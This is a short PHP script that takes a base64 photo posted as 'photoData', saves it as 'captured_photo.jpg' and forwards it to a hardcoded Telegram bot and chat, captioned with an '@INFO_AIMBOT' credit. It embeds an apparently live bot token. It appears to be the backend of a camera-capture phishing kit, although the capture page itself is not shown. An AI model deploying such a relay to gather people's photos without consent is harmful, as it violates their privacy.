<?php
$botToken = '6407133472:AAHEdXwqUMWAWlBcaFluPJyKXxzJyAxuhfE'; // Replace with your actual bot token
$chatId = '6657480603'; // Replace with your actual group chat ID

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['photoData'])) {
    $photoData = $_POST['photoData'];

    // Convert the data URL back to image data and save it as a file
    $imageData = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $photoData));
    $filename = 'captured_photo.jpg';
    file_put_contents($filename, $imageData);

    // Send the saved photo to your Telegram bot using cURL
    $url = "https://api.telegram.org/bot$botToken/sendPhoto";
    $postFields = [
        'chat_id' => $chatId,
        'photo' => new CURLFile($filename),
        'caption' => 'Mᴀᴅᴇ Bʏ:- @INFO_AIMBOT'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: multipart/form-data']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $result = curl_exec($ch);
    if ($result === false) {
        echo 'Error sending photo: ' . curl_error($ch);
    } else {
        echo 'Photo sent successfully!';
    }

    curl_close($ch);

    // Delete the temporary image file
    unlink($filename);
} else {
    echo 'Error receiving photo data.';
}
?>
